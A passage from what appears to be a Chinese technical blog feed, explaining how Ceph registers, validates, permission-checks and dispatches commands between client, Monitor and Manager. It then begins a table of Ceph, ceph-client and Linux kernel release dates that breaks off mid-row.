变量；</li></ol><h3 id="3-1-2、Manager-上报的命令"><a href="#3-1-2、Manager-上报的命令" class="headerlink" title="3.1.2、Manager 上报的命令"></a>3.1.2、Manager 上报的命令</h3><p><strong>Mgr 向 Mon 发送命令描述信息的两个触发方式:</strong></p><ul><li><strong>主动触发:</strong><ul><li>介绍: 当 mgr 初始化的时候就会向 mon 发送 MSG_MGR_BEACON 类型的消息（其中包含 mgr 和 py_module_registry 的命令信息） ；</li><li>函数调用链路: MgrStandby::init -&gt; MgrStandby::tick -&gt; MgrStandby::send_beacon -发送 MSG_MGR_BEACON 类型的消息-&gt; mon ；</li></ul></li><li><strong>被动触发:</strong><ul><li>介绍: 当 mgr 收到 MSG_MGR_MAP 类型的消息后，会向 mon 发送 MSG_MGR_BEACON 类型的消息；</li><li>函数调用链路: MgrStandby::ms_dispatch2 -收到 MSG_MGR_MAP 消息-&gt; MgrStandby::handle_mgr_map -&gt; MgrStandby::send_beacon -发送 MSG_MGR_BEACON 类型的消息-&gt; mon ；</li></ul></li></ul><p><strong>Manager 主动向 Monitor 注册命令描述信息的流程示意图:</strong></p><pre><code class="hljs mermaid">sequenceDiagram    participant MgrStandby    participant Monitor    participant MgrMonitor    participant Paxos    participant Storage    %% 触发路径    Note over MgrStandby: 触发条件    MgrStandby-&gt;&gt;MgrStandby: send_beacon()    MgrStandby-&gt;&gt;Monitor: MSG_MGR_BEACON    Note over MgrStandby,Monitor: 消息包含command_descs命令信息    %% Monitor接收解析    Monitor-&gt;&gt;Monitor: decode_message()    Note over Monitor: 解析出MMgrBeacon.command_descs    %% 准备阶段    Monitor-&gt;&gt;MgrMonitor: prepare_beacon()    MgrMonitor-&gt;&gt;MgrMonitor: get_command_descs()    Note over MgrMonitor: command_descs → pending_command_descs    %% 写入存储    MgrMonitor-&gt;&gt;Storage: 事务写入command_descs_prefix    Note over MgrMonitor: 包含command_descs信息    Note over MgrMonitor: 添加C_Committed回调    %% 提交刷新    Note over MgrMonitor: C_Committed::finish()    MgrMonitor-&gt;&gt;Paxos: commit_finish()    Paxos-&gt;&gt;Monitor: refresh_from_paxos()    Monitor-&gt;&gt;MgrMonitor: update_from_paxos()    MgrMonitor-&gt;&gt;Storage: 读取command_descs_prefix    Storage--&gt;&gt;MgrMonitor: command_descs数据</code></pre><h2 id="3-2、命令执行流程"><a href="#3-2、命令执行流程" class="headerlink" title="3.2、命令执行流程"></a>3.2、命令执行流程</h2><h3 id="3-2-1、Client-侧执行流程"><a href="#3-2-1、Client-侧执行流程" class="headerlink" title="3.2.1、Client 侧执行流程"></a>3.2.1、Client 侧执行流程</h3><p><strong>函数调用链路:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">main()<br>├── parse_cmdargs()                          <span class="hljs-comment"># 解析命令行参数</span><br>├── maybe_daemon_command()                   <span class="hljs-comment"># 检查是否为守护进程命令</span><br>├── rados.Rados().connect()                  <span class="hljs-comment"># 连接集群</span><br>├── json_command(<span class="hljs-string">&#x27;get_command_descriptions&#x27;</span>) <span class="hljs-comment"># 获取命令签名</span><br>├── parse_json_funcsigs()                    <span class="hljs-comment"># 解析签名</span><br>└── new_style_command()<br>    └── do_command()<br>        └── validate_command()               <span class="hljs-comment"># 关键：命令验证和匹配</span><br>            ├── 遍历所有命令签名<br>            ├── 计算匹配得分<br>            ├── 记录最佳匹配<br>            └── 返回验证后的参数字典<br>        └── json_command()                   <span class="hljs-comment"># 发送请求到monitor</span><br></code></pre></td></tr></table></figure><p><strong>validate_command 函数执行流程:</strong></p><ul><li><strong>评分筛选阶段</strong>: 从所有命令签名中筛选出与输入参数最匹配的候选命令；<ul><li>匹配度计算: 使用 matchnum() 计算匹配度（支持部分匹配）；</li><li>完全匹配优先: 完全匹配的命令获得额外 0.5 加分；</li><li>分数阈值: 只保留达到当前最高分的命令；</li><li>多候选收集: 相同分数的命令都保留</li></ul></li><li><strong>排序阶段</strong>: 对候选命令进行排序，优化后续验证效率；<ul><li>评分函数: grade() 计算命令的必需参数总数；</li><li>排序规则：按必需参数数量升序排列；</li></ul></li><li><strong>精确验证阶段</strong>: 对排序后的候选命令进行精确验证，找到真正匹配的命令；<ul><li>顺序尝试: 按排序顺序逐一验证；</li><li>短路优化: 一旦验证成功立即退出循环；</li></ul></li><li><strong>结果处理阶段</strong>: 根据验证结果提供反馈并返回最终结果；<ul><li>成功情况: 返回解析后的参数字典；</li><li>失败情况: 命令找到但参数错误（显示具体错误和命令帮助）， 完全无匹配：显示最接近的10个命令（过滤废弃&#x2F;隐藏命令）；</li></ul></li></ul><p><strong>validate_command 函数执行流程示意图:</strong></p><pre><code class="hljs mermaid">sequenceDiagram    participant U as 用户    participant VC as validate_command    participant M as matchnum    participant V as validate    participant S as 系统输出    U-&gt;&gt;VC: 调用(sigdict, args, verbose)    Note over VC: 阶段1: 评分筛选    loop 遍历sigdict中每个cmd        VC-&gt;&gt;M: matchnum(args, sig, partial=True)        M--&gt;&gt;VC: 返回分数matched        VC-&gt;&gt;M: matchnum(args, sig, partial=False)        M--&gt;&gt;VC: 返回完全匹配分数        alt 完全匹配奖励            VC-&gt;&gt;VC: matched += 0.5        end        alt 更新最佳匹配            VC-&gt;&gt;VC: 更新best_match_cnt和bestcmds        end        alt verbose模式            VC-&gt;&gt;S: 输出&quot;better match: X &gt; Y: command&quot;        end    end    Note over VC: 阶段2: 排序    VC-&gt;&gt;VC: 按必需参数数量排序bestcmds    alt verbose模式        VC-&gt;&gt;S: 输出&quot;bestcmds_sorted:&quot;和列表    end    Note over VC: 阶段3: 精确验证    loop 遍历bestcmds_sorted        VC-&gt;&gt;V: validate(args, sig, flags)        alt 验证成功            V--&gt;&gt;VC: 返回valid_dict            VC-&gt;&gt;VC: found = cmd, break循环        else 验证失败            V--xVC: 抛出异常            alt ArgumentPrefix异常                VC-&gt;&gt;VC: 继续尝试下一个            else ArgumentMissing异常                VC-&gt;&gt;VC: 记录ex, 如果只有一个候选则found=cmd                VC-&gt;&gt;VC: break循环            else ArgumentTooFew异常                VC-&gt;&gt;VC: verbose时输出提示,继续尝试            else ArgumentError异常                VC-&gt;&gt;VC: 记录ex, found = cmd                VC-&gt;&gt;VC: break循环            end        end    end    Note over VC: 阶段4: 结果处理    alt found不为空        alt valid_dict不为空            VC--&gt;&gt;U: 返回valid_dict        else            VC-&gt;&gt;S: 输出&quot;Invalid command:&quot;和ex            VC-&gt;&gt;S: 输出命令帮助            VC--&gt;&gt;U: 返回空字典        end    else        VC-&gt;&gt;VC: 过滤已弃用/隐藏命令        VC-&gt;&gt;VC: 限制最多10个建议        VC-&gt;&gt;S: 输出&quot;no valid command found; X closest matches:&quot;        loop 遍历bestcmds            VC-&gt;&gt;S: 输出命令签名        end        VC--&gt;&gt;U: 返回空字典    end</code></pre><p><strong>matchnum 函数执行流程:</strong></p><ul><li>从左到右扫描用户输入；</li><li>按模板顺序尝试匹配每个参数；</li><li>必需参数是关卡：失败就结束，成功就加分；</li><li>可选参数是通道：失败就跳过，成功就通过。注意：如果可选参数匹配失败了，则下一次匹配的时候还会匹配当前命令的这个参数（因为把匹配失败的当前参数又放回了队列头部），相当于实现非贪婪匹配机制（可选参数失败时回退，让其他规则尝试）；</li><li>最后返回：成功闯过了多少必需参数关卡，就返回多少数值；</li></ul><h3 id="3-2-2、Server-侧执行流程"><a href="#3-2-2、Server-侧执行流程" class="headerlink" title="3.2.2、Server 侧执行流程"></a>3.2.2、Server 侧执行流程</h3><p><strong>执行流程详解:</strong></p><ul><li><strong>基础验证</strong> : <ul><li><strong>命令类型断言</strong> : 确保请求是命令类型；</li><li><strong>FSID 校验</strong> : 验证消息中的集群 FSID 与当前 Monitor 的集群 ID 匹配，防止跨集群操作；</li><li><strong>会话检查</strong> : 确保命令来自一个已建立的客户端会话，丢弃“游离”消息；</li><li><strong>命令非空检查</strong> : 确保命令内容不为空；</li></ul></li><li><strong>命令解析与验证</strong> : <ul><li><strong>JSON 解析</strong> : 将客户端发送的 JSON 格式命令字符串解析为内部的 cmdmap（命令参数映射）；</li><li><strong>提取前缀</strong> : 从 cmdmap 中获取命令的 prefix（例如 “osd dump”, “status”）， prefix 是命令的唯一标识符；</li><li><strong>特殊命令处理</strong> : “get_command_descriptions” 命令用于获取所有支持的命令描述，直接在此处理并返回；</li></ul></li><li><strong>命令查找与兼容性检查</strong><ul><li><strong>模块提取</strong> : 从 prefix 中提取第一个单词作为命令模块（如 osd, mds, mon）；</li><li><strong>三层命令查找</strong> : <ul><li>Leader 命令集 (leader_mon_commands) : 集群领导者支持的所有命令；</li><li>Mgr 命令集 (mgrmon()-&gt;get_command_descs()) : 由 Ceph Manager 模块管理的命令；</li><li>本地命令集 (get_local_commands) : 当前 Monitor 实例支持的命令（考虑特性兼容性）；</li></ul></li><li><strong>领导者&#x2F;追随者逻辑处理</strong> : 如果当前 Monitor 不是领导者，则通常可以转发命令给领导者，但是如果执行的命令不在本地命令集中且命令不允许转发或者与领导者的命令不兼容，则不转发并返回错误；</li></ul></li><li><strong>权限与审计</strong> : <ul><li><strong>废弃命令检查</strong> : 拒绝执行已废弃或过时的命令；</li><li><strong>权限验证 (_allowed_command)</strong>: 基于客户端的会话、身份（entity_name，如 client.admin）和能力（Capabilities）验证其是否有权执行该命令，涉及 ‘w’（写）或 ‘x’（执行）权限的命令被视为“读写命令”；</li><li><strong>审计日志</strong> : 所有命令（除少数配置命令外）都会被记录到审计日志 (audit_clog) 中，区分读写操作的日志级别；</li></ul></li><li><strong>命令路由与分发</strong> : 这是函数的主体，根据 prefix 或 module 将命令分发给对应的 Monitor 子服务 或直接处理；<ul><li><strong>代理到 Manager</strong> : 如果命令标记为 is_mgr()，则代理给 mgr_client 执行，并设有字节数配额防止过载；</li><li><strong>分发给专用监视器</strong> : 执行对应的 PaxosService::dispatch 函数；<ul><li>mdsmon() : 处理 mds 或 fs 相关命令；</li><li>osdmon() : 处理 osd、pg map、pg repeer 命令；</li><li>configmon() : 处理 config 配置命令；</li><li>monmon() : 处理大部分 mon 命令（除明确列出的几个）；</li><li>healthmon() : 处理 health 子命令；</li><li>authmon() : 处理 auth 认证和授权命令；</li><li>logmon() : 处理 log 日志命令；</li><li>kvmon() : 处理 config-key 键值存储命令；</li><li>mgrmon() : 处理 mgr 管理器命令；</li><li>nvmegwmon() : 处理 nvme-gw 网关命令；</li></ul></li><li><strong>Monitor 自身处理的命令</strong> ：一系列核心的、跨模块的或状态查询命令由 Monitor 类直接处理；这是函数中 else if 链最长的部分，包括：<ul><li>fsid : 返回集群 FSID；</li><li>mon scrub : 启动 Monitor 存储区清理；</li><li>time-sync-status : 返回集群时间同步状态；</li><li>status &#x2F; health &#x2F; df : 返回集群状态、健康详情或使用情况；</li><li>report : 生成包含集群各方面信息的详细报告；</li><li>node ls : 列出各种类型的守护进程节点；</li><li>features : 列出集群中激活的特性；</li><li>mon metadata &#x2F; versions &#x2F; count-metadata : 查询 Monitor 元数据或版本信息；</li><li>quorum_status : 返回仲裁状态；</li><li>mon ok-to-stop &#x2F; ok-to-add-offline &#x2F; ok-to-rm : 安全性地检查 Monitor 节点操作；</li><li>version &#x2F; versions : 返回 Ceph 版本信息；</li></ul></li></ul></li></ul><p><strong>简要执行流程图:</strong></p><pre><code class="hljs mermaid">sequenceDiagram    participant C as Client    participant M as Monitor    participant L as Leader    participant S as SubService    C-&gt;&gt;M: MMonCommand 请求    Note over M: 1. 基础验证    M-&gt;&gt;M: FSID/会话/命令检查    Note over M: 2. 命令解析    M-&gt;&gt;M: 解析JSON，提取prefix    alt 特殊命令        M-&gt;&gt;C: 直接返回    end    Note over M: 3. 领导者检查    alt M不是领导者        M-&gt;&gt;L: 转发请求        L-&gt;&gt;C: 处理并返回    end    Note over M: 4. 权限检查    M-&gt;&gt;M: 权限验证    Note over M: 5. 命令分发    alt Mgr命令        M-&gt;&gt;M: 代理到Manager    else 模块命令        M-&gt;&gt;S: 分发到子服务        S-&gt;&gt;M: 返回结果    else Monitor命令        M-&gt;&gt;M: 直接处理    end    M-&gt;&gt;C: 返回结果</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ceph 和 LinuxKernel 版本时间对照表</title>
      <link href="/2025/11/08/ceph_linux_versions/"/>
      <url>/2025/11/08/ceph_linux_versions/</url>
      
        <content type="html"><![CDATA[<p>本文提供了一份详细的Ceph、Ceph-client与Linux内核版本对应关系表，涵盖了从2015年至今的月度发布记录。内容包含各版本的具体发布时间、GitHub链接以及三个组件的时间轴甘特图，旨在帮助用户快速查询和规划Ceph部署时所需的内核兼容性。</p><h1 id="一、版本时间对照"><a href="#一、版本时间对照" class="headerlink" title="一、版本时间对照"></a>一、版本时间对照</h1><h2 id="1-1、版本时间对照表"><a href="#1-1、版本时间对照表" class="headerlink" title="1.1、版本时间对照表"></a>1.1、版本时间对照表</h2><table><thead><tr><th align="center">Month</th><th align="center">ceph</th><th align="center">ceph-client</th><th align="center">linux</th></tr></thead><tbody><tr><td align="center">2011-07</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.0" title="2011-07-22 10:17:29">v3.0</a></td></tr><tr><td align="center">2011-10</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.1" title="2011-10-24 15:10:51">v3.1</a></td></tr><tr><td align="center">2012-01</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.2" title="2012-01-05 07:55:50">v3.2</a></td></tr><tr><td align="center">2012-03</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.3" title="2012-03-19 07:15:42">v3.3</a></td></tr><tr><td align="center">2012-05</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.4" title="2012-05-21 06:29:25">v3.4</a></td></tr><tr><td align="center">2012-07</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.5" title="2012-07-22 04:58:43">v3.5</a></td></tr><tr><td align="center">2012-10</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.6" title="2012-10-01 07:48:10">v3.6</a></td></tr><tr><td align="center">2012-12</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.7" title="2012-12-11 11:31:01">v3.7</a></td></tr><tr><td align="center">2013-02</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.8" title="2013-02-19 07:59:05">v3.8</a></td></tr><tr><td align="center">2013-04</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.9" title="2013-04-29 08:36:09">v3.9</a></td></tr><tr><td align="center">2013-07</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.10" title="2013-07-01 06:13:42">v3.10</a></td></tr><tr><td align="center">2013-09</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.11" title="2013-09-03 04:46:18">v3.11</a></td></tr><tr><td align="center">2013-11</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.12" title="2013-11-04 07:41:59">v3.12</a></td></tr><tr><td align="center">2014-01</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.13" title="2014-01-20 10:40:23">v3.13</a></td></tr><tr><td align="center">2014-03</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.14" title="2014-03-31 11:40:23">v3.14</a></td></tr><tr><td align="center">2014-06</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.15" title="2014-06-09 02:20:02">v3.15</a></td></tr><tr><td align="center">2014-08</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.16" title="2014-08-04 06:25:25">v3.16</a></td></tr><tr><td align="center">2014-10</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.17" title="2014-10-06 03:23:20">v3.17</a></td></tr><tr><td align="center">2014-12</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.18" title="2014-12-08 06:21:13">v3.18</a></td></tr><tr><td align="center">2015-02</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v3.19" title="2015-02-09 10:54:38">v3.19</a></td></tr><tr><td align="center">2015-04</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.0" title="2015-04-13 06:13:03">v4.0</a></td></tr><tr><td align="center">2015-06</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.1" title="2015-06-22 13:06:00">v4.1</a></td></tr><tr><td align="center">2015-08</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.2" title="2015-08-31 02:34:17">v4.2</a></td></tr><tr><td align="center">2015-11</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v9.2.0" title="2015-11-04 00:58:34">v9.2.0</a></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.3" title="2015-11-02 08:05:39">v4.3</a></td></tr><tr><td align="center">2016-01</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.4" title="2016-01-11 07:01:54">v4.4</a></td></tr><tr><td align="center">2016-02</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v9.2.1" title="2016-02-25 06:07:27">v9.2.1</a></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">2016-03</td><td align="center"></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.5" title="2016-03-14 12:29:05">v4.5</a></td></tr><tr><td align="center">2016-04</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v10.2.0" title="2016-04-20 19:29:49">v10.2.0</a><br><a href="https://github.com/ceph/ceph/releases/tag/v10.2.01" title="2016-04-28 03:27:19">v10.2.01</a></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">2016-05</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v10.2.1" title="2016-05-14 04:20:20">v10.2.1</a></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.6" title="2016-05-16 06:43:23">v4.6</a></td></tr><tr><td align="center">2016-06</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v10.2.2" title="2016-06-14 19:43:27">v10.2.2</a></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">2016-07</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.7-rc8" title="2016-07-23 23:11:01">ceph-for-4.7-rc8</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.7" title="2016-07-25 03:24:02">v4.7</a></td></tr><tr><td align="center">2016-08</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.8-rc1" title="2016-08-02 21:38:49">ceph-for-4.8-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.8-rc2" title="2016-08-11 20:59:02">ceph-for-4.8-rc2</a></td><td align="center"></td></tr><tr><td align="center">2016-09</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v10.2.3" title="2016-09-21 06:04:25">v10.2.3</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.8-rc6" title="2016-09-08 20:49:51">ceph-for-4.8-rc6</a></td><td align="center"></td></tr><tr><td align="center">2016-10</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.9-rc1" title="2016-10-08 21:45:49">ceph-for-4.9-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.9-rc2" title="2016-10-21 00:31:31">ceph-for-4.9-rc2</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.8" title="2016-10-03 07:24:40">v4.8</a></td></tr><tr><td align="center">2016-11</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.9-rc5" title="2016-11-11 22:41:48">ceph-for-4.9-rc5</a></td><td align="center"></td></tr><tr><td align="center">2016-12</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v10.2.4" title="2016-12-06 06:15:22">v10.2.4</a><br><a href="https://github.com/ceph/ceph/releases/tag/v10.2.5" title="2016-12-10 04:08:25">v10.2.5</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.10-rc1" title="2016-12-17 00:54:36">ceph-for-4.10-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.9-rc9" title="2016-12-09 18:55:24">ceph-for-4.9-rc9</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.9" title="2016-12-12 03:18:02">v4.9</a></td></tr><tr><td align="center">2017-01</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v11.2.0" title="2017-01-19 21:08:40">v11.2.0</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.10-rc4" title="2017-01-14 01:17:40">ceph-for-4.10-rc4</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.10-rc5" title="2017-01-20 22:13:58">ceph-for-4.10-rc5</a></td><td align="center"></td></tr><tr><td align="center">2017-02</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.11-rc1" title="2017-02-28 22:45:46">ceph-for-4.11-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.10" title="2017-02-20 06:34:08">v4.10</a></td></tr><tr><td align="center">2017-03</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v10.2.6" title="2017-03-07 21:29:41">v10.2.6</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.11-rc2" title="2017-03-10 23:06:42">ceph-for-4.11-rc2</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.11-rc4" title="2017-03-24 19:58:54">ceph-for-4.11-rc4</a></td><td align="center"></td></tr><tr><td align="center">2017-04</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v10.2.7" title="2017-04-10 19:43:45">v10.2.7</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.11-rc9" title="2017-04-27 23:26:11">ceph-for-4.11-rc9</a></td><td align="center"></td></tr><tr><td align="center">2017-05</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.12-rc1" title="2017-05-10 17:38:47">ceph-for-4.12-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.12-rc3" title="2017-05-26 22:34:49">ceph-for-4.12-rc3</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.11" title="2017-05-01 10:48:00">v4.11</a></td></tr><tr><td align="center">2017-06</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.12-rc4" title="2017-06-02 23:17:00">ceph-for-4.12-rc4</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.12-rc6" title="2017-06-17 21:34:47">ceph-for-4.12-rc6</a></td><td align="center"></td></tr><tr><td align="center">2017-07</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v10.2.8" title="2017-07-06 22:56:19">v10.2.8</a><br><a href="https://github.com/ceph/ceph/releases/tag/v10.2.9" title="2017-07-13 21:04:57">v10.2.9</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.13-rc1" title="2017-07-11 21:05:49">ceph-for-4.13-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.13-rc2" title="2017-07-19 22:32:12">ceph-for-4.13-rc2</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.12" title="2017-07-03 07:07:11">v4.12</a></td></tr><tr><td align="center">2017-08</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v11.2.1" title="2017-08-09 03:07:08">v11.2.1</a><br><a href="https://github.com/ceph/ceph/releases/tag/v12.2.0" title="2017-08-29 00:30:20">v12.2.0</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.13-rc4" title="2017-08-04 23:10:45">ceph-for-4.13-rc4</a></td><td align="center"></td></tr><tr><td align="center">2017-09</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v12.2.1" title="2017-09-27 00:27:09">v12.2.1</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.13-rc8" title="2017-09-01 23:48:47">ceph-for-4.13-rc8</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.14-rc1" title="2017-09-12 22:08:47">ceph-for-4.14-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.14-rc2" title="2017-09-22 21:16:56">ceph-for-4.14-rc2</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.13" title="2017-09-04 04:56:28">v4.13</a></td></tr><tr><td align="center">2017-10</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v10.2.10" title="2017-10-04 22:17:27">v10.2.10</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.14-rc4" title="2017-10-06 22:01:19">ceph-for-4.14-rc4</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.14-rc7" title="2017-10-26 16:00:59">ceph-for-4.14-rc7</a></td><td align="center"></td></tr><tr><td align="center">2017-11</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v12.2.2" title="2017-11-30 22:59:28">v12.2.2</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.14-rc9" title="2017-11-10 22:01:00">ceph-for-4.14-rc9</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.15-rc1" title="2017-11-21 01:10:22">ceph-for-4.15-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.14" title="2017-11-13 02:46:21">v4.14</a></td></tr><tr><td align="center">2017-12</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.15-rc4" title="2017-12-16 00:18:44">ceph-for-4.15-rc4</a></td><td align="center"></td></tr><tr><td align="center">2018-01</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.15-rc8" title="2018-01-12 00:54:17">ceph-for-4.15-rc8</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.15" title="2018-01-29 05:20:41">v4.15</a></td></tr><tr><td align="center">2018-02</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v12.2.3" title="2018-02-20 07:14:48">v12.2.3</a><br><a href="https://github.com/ceph/ceph/releases/tag/v12.2.4" title="2018-02-27 05:47:19">v12.2.4</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.16-rc1" title="2018-02-08 22:22:41">ceph-for-4.16-rc1</a></td><td align="center"></td></tr><tr><td align="center">2018-03</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.16-rc4" title="2018-03-02 22:21:11">ceph-for-4.16-rc4</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.16-rc8" title="2018-03-30 21:30:42">ceph-for-4.16-rc8</a></td><td align="center"></td></tr><tr><td align="center">2018-04</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v12.2.5" title="2018-04-24 00:18:34">v12.2.5</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.17-rc1" title="2018-04-11 00:11:32">ceph-for-4.17-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.17-rc2" title="2018-04-18 22:41:42">ceph-for-4.17-rc2</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.17-rc3" title="2018-04-27 21:52:28">ceph-for-4.17-rc3</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.16" title="2018-04-02 05:20:37">v4.16</a></td></tr><tr><td align="center">2018-05</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v13.2.0" title="2018-05-31 21:13:46">v13.2.0</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.17-rc5" title="2018-05-11 23:24:54">ceph-for-4.17-rc5</a></td><td align="center"></td></tr><tr><td align="center">2018-06</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.18-rc1" title="2018-06-14 18:50:47">ceph-for-4.18-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.18-rc3" title="2018-06-29 22:14:04">ceph-for-4.18-rc3</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.17" title="2018-06-04 05:15:30">v4.17</a></td></tr><tr><td align="center">2018-07</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v10.2.11" title="2018-07-10 00:23:09">v10.2.11</a><br><a href="https://github.com/ceph/ceph/releases/tag/v12.2.6" title="2018-07-10 00:18:48">v12.2.6</a><br><a href="https://github.com/ceph/ceph/releases/tag/v12.2.7" title="2018-07-17 